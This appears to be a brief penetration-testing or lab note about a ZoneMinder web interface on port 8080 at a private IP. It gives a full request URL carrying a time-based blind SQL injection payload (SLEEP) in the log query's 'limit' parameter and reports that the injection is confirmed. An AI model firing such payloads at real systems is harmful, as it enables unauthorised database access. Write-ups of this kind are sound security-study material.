
# 8080

There is a zoneminder website:
![](attachment/75c6fad207fc4e33018aac2a3e324a01.png)

`http://192.168.212.52:8080/zm/index.php?view=request&request=log&task=query&limit=100;(SELECT%20*FROM%20(SELECT(SLEEP(5)))OQkj)#&minTime=1466674406.084434`

We get a return info back:
![](attachment/2d242ee56adca8e1c132311a41f7c5ff.png)

We have SQL injection:![](attachment/7cac5b58a4436ccec9061abc79c921d6.png)

SQLMap required so not done after this.

